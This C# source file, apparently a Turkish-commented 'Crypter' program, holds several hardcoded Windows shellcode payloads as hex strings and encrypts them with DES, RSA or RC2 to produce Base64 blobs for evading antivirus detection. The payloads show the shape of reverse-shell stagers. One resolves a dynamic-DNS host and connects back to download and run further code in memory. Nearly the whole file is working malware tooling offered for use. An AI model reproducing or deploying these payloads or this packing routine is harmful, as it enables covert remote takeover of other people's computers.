using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;

namespace Crypter
{

    class Program
    {
        // Veriyi Byte Değerine Dönüştürme // 

        public static byte[] ByteDonustur(string veri)
        {
            UnicodeEncoding ByteConverter = new UnicodeEncoding();
            return ByteConverter.GetBytes(veri);
        }

        public static byte[] Byte8(string veri)
        {
            char[] ArrayChar = veri.ToCharArray();
            byte[] ArrayByte = new byte[ArrayChar.Length];
            for (int i = 0; i < ArrayByte.Length; i++)
            {
                ArrayByte[i] = Convert.ToByte(ArrayChar[i]);
            }

            return ArrayByte;
        }

        // MD5 ŞİFRELEME

        public string MD5(string veriGiris)
        {
            if (veriGiris == "" || veriGiris == null)
            {
                throw new ArgumentNullException("Şifrelenecek veri yok");
            }
            else
            {
                MD5CryptoServiceProvider sifre = new MD5CryptoServiceProvider();
                byte[] arySifre = ByteDonustur(veriGiris);
                byte[] aryHash = sifre.ComputeHash(arySifre);
                return BitConverter.ToString(aryHash);
            }
        }

        // DES ŞİFERELEME
        public static void DESSifrele()
        {
            string sonuc = "";
            string giris = "0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x31,0xdb,0x53,0x68,0x02,0x00,0x14,0xe9,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0xc2,0xdb,0x37,0x67,0xff,0xd5,0x53,0x57,0x68,0xb7,0xe9,0x38,0xff,0xff,0xd5,0x53,0x53,0x57,0x68,0x74,0xec,0x3b,0xe1,0xff,0xd5,0x57,0x97,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3";


            {
                byte[] aryKey = Byte8("88008800"); // BURAYA 8 bit string DEĞER GİRİN
                byte[] aryIV = Byte8("88008800"); // BURAYA 8 bit string DEĞER GİRİN
                DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();
                MemoryStream ms = new MemoryStream();
                CryptoStream cs = new CryptoStream(ms, cryptoProvider.CreateEncryptor(aryKey, aryIV), CryptoStreamMode.Write);
                StreamWriter writer = new StreamWriter(cs);
                writer.Write(giris);
                writer.Flush();
                cs.FlushFinalBlock();
                writer.Flush();
                sonuc = Convert.ToBase64String(ms.GetBuffer(), 0, (int)ms.Length);
                writer.Dispose();
                cs.Dispose();
                ms.Dispose();

                Console.WriteLine(sonuc);
                Console.ReadLine();
            }
            
        }
        // TEST BAŞARILI
        public static string DESCoz(string strGiris)
        {
            string strSonuc = "";
            if (strGiris == "" || strGiris == null)
            {
                throw new ArgumentNullException("Şifrelenecek veri yok.");
            }
            else
            {
                byte[] aryKey = Byte8("12345678");
                byte[] aryIV = Byte8("12345678");
                DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();
                MemoryStream ms = new MemoryStream(Convert.FromBase64String(strGiris));
                CryptoStream cs = new CryptoStream(ms, cryptoProvider.CreateDecryptor(aryKey, aryIV), CryptoStreamMode.Read);
                StreamReader reader = new StreamReader(cs);
                strSonuc = reader.ReadToEnd();
                reader.Dispose();
                cs.Dispose();
                ms.Dispose();
            }
            return strSonuc;
        }

        /// <summary>
        /// ///////////////////////////////////////////////////////////////////////////////////////////////////
        /// </summary>
        /// <param name="args"></param>
        /// 

        public static void DES_Sifrele()
        {
            string strGiris = "0xeb,0x18,0x5e,0x8d,0x3e,0x31,0xc0,0x31,0xdb,0x8a,0x1c,0x06,0x80,0xfb,0x03,0x74,0x0e,0x80,0xf3,0x05,0x88,0x1f,0x47,0x40,0xeb,0xef,0xe8,0xe3,0xff,0xff,0xff,0xf9,0xed,0x8c,0x05,0x05,0x05,0x65,0x8c,0xe0,0x34,0xd7,0x61,0x8e,0x57,0x35,0x8e,0x57,0x09,0x8e,0x57,0x11,0x8e,0x77,0x2d,0x0a,0xb2,0x4f,0x23,0x34,0xfa,0x34,0xc5,0xa9,0x39,0x64,0x79,0x07,0x29,0x25,0xc4,0xca,0x08,0x04,0xc2,0xe7,0xf5,0x57,0x52,0x8e,0x57,0x15,0x8e,0x47,0x39,0x04,0xd5,0x8e,0x45,0x7d,0x80,0xc5,0x71,0x4f,0x04,0xd5,0x55,0x8e,0x4d,0x1d,0x8e,0x5d,0x25,0x04,0xd6,0xe6,0x39,0x4c,0x8e,0x31,0x8e,0x04,0xd3,0x34,0xfa,0x34,0xc5,0xa9,0xc4,0xca,0x08,0x04,0xc2,0x3d,0xe5,0x70,0xf1,0x06,0x78,0xfd,0x3e,0x78,0x21,0x70,0xe7,0x5d,0x8e,0x5d,0x21,0x04,0xd6,0x63,0x8e,0x09,0x4e,0x8e,0x5d,0x19,0x04,0xd6,0x8e,0x01,0x8e,0x04,0xd5,0x8c,0x41,0x21,0x21,0x5e,0x5e,0x64,0x5c,0x5f,0x54,0xfa,0xe5,0x5d,0x5a,0x5f,0x8e,0x17,0xee,0x83,0x58,0x6d,0x36,0x37,0x05,0x05,0x6d,0x72,0x76,0x37,0x5a,0x51,0x6d,0x49,0x72,0x23,0x02,0xfa,0xd0,0xbd,0x95,0x04,0x05,0x05,0x2c,0xc1,0x51,0x55,0x6d,0x2c,0x85,0x6e,0x05,0xfa,0xd0,0x55,0x55,0x55,0x55,0x45,0x55,0x45,0x55,0x6d,0xef,0x0a,0xda,0xe5,0xfa,0xd0,0x92,0xee,0x2a,0x6d,0xac,0x2d,0x31,0x85,0xfa,0xd0,0x8e,0x45,0x19,0x6f,0x0c,0x55,0x6d,0x07,0x05,0x14,0x5e,0x8c,0xe3,0x6f,0x15,0x53,0x52,0x6d,0x9c,0xa0,0x71,0x64,0xfa,0xd0,0x80,0xc5,0x71,0x54,0xfa,0x4b,0x0d,0x70,0xe9,0x6d,0xf5,0xb0,0xa7,0x53,0xfa,0xd0,0xed,0xc9,0xfa,0xfa,0xfa,0x6e,0x69,0x6b,0x61,0x77,0x64,0x6d,0x67,0x2b,0x61,0x70,0x66,0x6e,0x61,0x6b,0x76,0x2b,0x6a,0x77,0x62,0x05,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x05,0x6f,0x05,0x6f,0x01,0x53,0x52,0x6d,0x07,0xdc,0xcd,0x5a,0xfa,0xd0,0x8e,0x33,0x6f,0x45,0x6d,0x05,0x15,0x05,0x05,0x53,0x6f,0x05,0x6d,0x5d,0xa1,0x56,0xe0,0xfa,0xd0,0x96,0x56,0x6f,0x05,0x53,0x56,0x52,0x6d,0x07,0xdc,0xcd,0x5a,0xfa,0xd0,0x04,0xc6,0x2c,0xc3,0x80,0xf3,0x70,0xe9,0xc6,0x03";

            


            string sonuc = "";
            if (strGiris == "" || strGiris == null)
            {
                throw new ArgumentNullException("Şifrelenecek veri yok");
            }
            else
            {
                byte[] aryKey = Byte8("53535353"); // BURAYA 8 bit string DEĞER GİRİN
                byte[] aryIV = Byte8("53535353"); // BURAYA 8 bit string DEĞER GİRİN
                DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();
                MemoryStream ms = new MemoryStream();
                CryptoStream cs = new CryptoStream(ms, cryptoProvider.CreateEncryptor(aryKey, aryIV), CryptoStreamMode.Write);
                StreamWriter writer = new StreamWriter(cs);
                writer.Write(strGiris);
                writer.Flush();
                cs.FlushFinalBlock();
                writer.Flush();
                sonuc = Convert.ToBase64String(ms.GetBuffer(), 0, (int)ms.Length);
                writer.Dispose();
                cs.Dispose();
                ms.Dispose();


                Console.WriteLine(sonuc);
                Console.ReadLine();

            }
        }


        public static void DES_Sifre_Coz()
        {
            string strGiris;

            Console.WriteLine("Lütfen şifresi çözülecek veriyi giriniz : ");
            strGiris = Console.ReadLine();
            string strSonuc = "";
            if (strGiris == "" || strGiris == null)
            {
                throw new ArgumentNullException("Şifrelenecek veri yok.");
            }
            else
            {
                byte[] aryKey = Byte8("11111111");
                byte[] aryIV = Byte8("11111111");
                DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();
                MemoryStream ms = new MemoryStream(Convert.FromBase64String(strGiris));
                CryptoStream cs = new CryptoStream(ms, cryptoProvider.CreateDecryptor(aryKey, aryIV), CryptoStreamMode.Read);
                StreamReader reader = new StreamReader(cs);
                strSonuc = reader.ReadToEnd();
                reader.Dispose();
                cs.Dispose();
                ms.Dispose();

                Console.WriteLine(strSonuc);
                Console.ReadLine();
            }
        }

        public static void RSA_Sifrele(out RSAParameters prm)

        {
               string strGiris = "0xeb,0x18,0x5e,0x8d,0x3e,0x31,0xc0,0x31,0xdb,0x8a,0x1c,0x06,0x80,0xfb,0x03,0x74,0x0e,0x80,0xf3,0x05,0x88,0x1f,0x47,0x40,0xeb,0xef,0xe8,0xe3,0xff,0xff,0xff,0xf9,0xed,0x8c,0x05,0x05,0x05,0x65,0x8c,0xe0,0x34,0xd7,0x61,0x8e,0x57,0x35,0x8e,0x57,0x09,0x8e,0x57,0x11,0x8e,0x77,0x2d,0x0a,0xb2,0x4f,0x23,0x34,0xfa,0x34,0xc5,0xa9,0x39,0x64,0x79,0x07,0x29,0x25,0xc4,0xca,0x08,0x04,0xc2,0xe7,0xf5,0x57,0x52,0x8e,0x57,0x15,0x8e,0x47,0x39,0x04,0xd5,0x8e,0x45,0x7d,0x80,0xc5,0x71,0x4f,0x04,0xd5,0x55,0x8e,0x4d,0x1d,0x8e,0x5d,0x25,0x04,0xd6,0xe6,0x39,0x4c,0x8e,0x31,0x8e,0x04,0xd3,0x34,0xfa,0x34,0xc5,0xa9,0xc4,0xca,0x08,0x04,0xc2,0x3d,0xe5,0x70,0xf1,0x06,0x78,0xfd,0x3e,0x78,0x21,0x70,0xe7,0x5d,0x8e,0x5d,0x21,0x04,0xd6,0x63,0x8e,0x09,0x4e,0x8e,0x5d,0x19,0x04,0xd6,0x8e,0x01,0x8e,0x04,0xd5,0x8c,0x41,0x21,0x21,0x5e,0x5e,0x64,0x5c,0x5f,0x54,0xfa,0xe5,0x5d,0x5a,0x5f,0x8e,0x17,0xee,0x83,0x58,0x6d,0x36,0x37,0x05,0x05,0x6d,0x72,0x76,0x37,0x5a,0x51,0x6d,0x49,0x72,0x23,0x02,0xfa,0xd0,0xbd,0x95,0x04,0x05,0x05,0x2c,0xc1,0x51,0x55,0x6d,0x2c,0x85,0x6e,0x05,0xfa,0xd0,0x55,0x55,0x55,0x55,0x45,0x55,0x45,0x55,0x6d,0xef,0x0a,0xda,0xe5,0xfa,0xd0,0x92,0xee,0x2a,0x6d,0xac,0x2d,0x31,0x85,0xfa,0xd0,0x8e,0x45,0x19,0x6f,0x0c,0x55,0x6d,0x07,0x05,0x14,0x5e,0x8c,0xe3,0x6f,0x15,0x53,0x52,0x6d,0x9c,0xa0,0x71,0x64,0xfa,0xd0,0x80,0xc5,0x71,0x54,0xfa,0x4b,0x0d,0x70,0xe9,0x6d,0xf5,0xb0,0xa7,0x53,0xfa,0xd0,0xed,0xc9,0xfa,0xfa,0xfa,0x6e,0x69,0x6b,0x61,0x77,0x64,0x6d,0x67,0x2b,0x61,0x70,0x66,0x6e,0x61,0x6b,0x76,0x2b,0x6a,0x77,0x62,0x05,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x5d,0x05,0x6f,0x05,0x6f,0x01,0x53,0x52,0x6d,0x07,0xdc,0xcd,0x5a,0xfa,0xd0,0x8e,0x33,0x6f,0x45,0x6d,0x05,0x15,0x05,0x05,0x53,0x6f,0x05,0x6d,0x5d,0xa1,0x56,0xe0,0xfa,0xd0,0x96,0x56,0x6f,0x05,0x53,0x56,0x52,0x6d,0x07,0xdc,0xcd,0x5a,0xfa,0xd0,0x04,0xc6,0x2c,0xc3,0x80,0xf3,0x70,0xe9,0xc6,0x03";
               string strSonuc;
           
            
            
                byte[] aryDizi = ByteDonustur(strGiris);
                RSACryptoServiceProvider dec = new RSACryptoServiceProvider();
                prm = dec.ExportParameters(true);
                byte[] aryDonus = dec.Encrypt(aryDizi, false);
                strSonuc = Convert.ToBase64String(aryDonus);

                Console.WriteLine(strSonuc);
                Console.ReadLine();

            
        }

        public static void RSA_Sifre_Coz(RSAParameters prm)

        {
            string strGiris;

            Console.WriteLine("Çözülecek veriyi giriniz : ");
            strGiris = Console.ReadLine();
            string strSonuc = "";
            if (strGiris == "" || strGiris == null)
            {
                throw new ArgumentNullException("veri yok");
            }
            else
            {
                RSACryptoServiceProvider dec = new RSACryptoServiceProvider();
                byte[] aryDizi = Convert.FromBase64String(strGiris);
                UnicodeEncoding UE = new UnicodeEncoding();
                dec.ImportParameters(prm);
                byte[] aryDonus = dec.Decrypt(aryDizi, false);
                strSonuc = UE.GetString(aryDonus);

                Console.WriteLine(strSonuc);
                Console.ReadLine();

            }
        }

        public static void RC2_Sifrele()
        {
            string strGiris = "0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0xe8,0x15,0x00,0x00,0x00,0x6b,0x6c,0x6e,0x64,0x72,0x61,0x68,0x62,0x2e,0x64,0x75,0x63,0x6b,0x64,0x6e,0x73,0x2e,0x6f,0x72,0x67,0x00,0x68,0xa9,0x28,0x34,0x80,0xff,0xd5,0x8b,0x40,0x1c,0x6a,0x0a,0x50,0x68,0x02,0x00,0x11,0x5b,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0xdc,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x49,0x8b,0x36,0x81,0xf6,0xaa,0x06,0x7d,0x28,0x8d,0x8e,0x00,0x01,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x51,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x8d,0x98,0x00,0x01,0x00,0x00,0x53,0x56,0x50,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x4b,0xff,0xff,0xff,0xe9,0x88,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0x5b,0x59,0x5d,0x55,0x57,0x89,0xdf,0xe8,0x10,0x00,0x00,0x00,0x4c,0xf3,0xe6,0x0d,0xf1,0x0d,0xc4,0xa7,0x61,0xeb,0x50,0x8a,0x9b,0xe4,0xca,0x20,0x5e,0x31,0xc0,0xaa,0xfe,0xc0,0x75,0xfb,0x81,0xef,0x00,0x01,0x00,0x00,0x31,0xdb,0x02,0x1c,0x07,0x89,0xc2,0x80,0xe2,0x0f,0x02,0x1c,0x16,0x8a,0x14,0x07,0x86,0x14,0x1f,0x88,0x14,0x07,0xfe,0xc0,0x75,0xe8,0x31,0xdb,0xfe,0xc0,0x02,0x1c,0x07,0x8a,0x14,0x07,0x86,0x14,0x1f,0x88,0x14,0x07,0x02,0x14,0x1f,0x8a,0x14,0x17,0x30,0x55,0x00,0x45,0x49,0x75,0xe5,0x5f,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5";
            

            string sonuc = "";
           
                byte[] aryKey = Byte8("64206420");
                byte[] aryIV = Byte8("64206420");
                RC2CryptoServiceProvider dec = new RC2CryptoServiceProvider();
                MemoryStream ms = new MemoryStream();
                CryptoStream cs = new CryptoStream(ms, dec.CreateEncryptor(aryKey, aryIV), CryptoStreamMode.Write);
                StreamWriter writer = new StreamWriter(cs);
                writer.Write(strGiris);
                writer.Flush();
                cs.FlushFinalBlock();
                writer.Flush();
                sonuc = Convert.ToBase64String(ms.GetBuffer(), 0, (int)ms.Length);
                writer.Dispose();
                cs.Dispose();
                ms.Dispose();

                Console.WriteLine(sonuc);
                Console.ReadLine();
            
            
        }

        public static void RC2_Coz()
        {
            string strGiris;
            Console.WriteLine("Çözülecek veriyi giriniz : ");
            strGiris = Console.ReadLine();

            string strSonuc = "";
            if (strGiris == "" || strGiris == null)
            {
                throw new ArgumentNullException("veri yok.");
            }
            else
            {
                byte[] aryKey = Byte8("12345678");
                byte[] aryIV = Byte8("12345678");
                RC2CryptoServiceProvider cp = new RC2CryptoServiceProvider();
                MemoryStream ms = new MemoryStream(Convert.FromBase64String(strGiris));
                CryptoStream cs = new CryptoStream(ms, cp.CreateDecryptor(aryKey, aryIV), CryptoStreamMode.Read);
                StreamReader reader = new StreamReader(cs);
                strSonuc = reader.ReadToEnd();
                reader.Dispose();
                cs.Dispose();
                ms.Dispose();

                Console.WriteLine(strSonuc);
                Console.ReadLine();
            }
            
        }

        static void Main(string[] args)
        {
            // DES_Sifrele();
            // DES_Sifre_Coz();

            DESSifrele();

           // RSAParameters a;
           // RSA_Sifrele(out a);
           // RSA_Sifre_Coz(a);

            // RC2_Sifrele();
            // RC2_Coz();


        }
    }
}


    
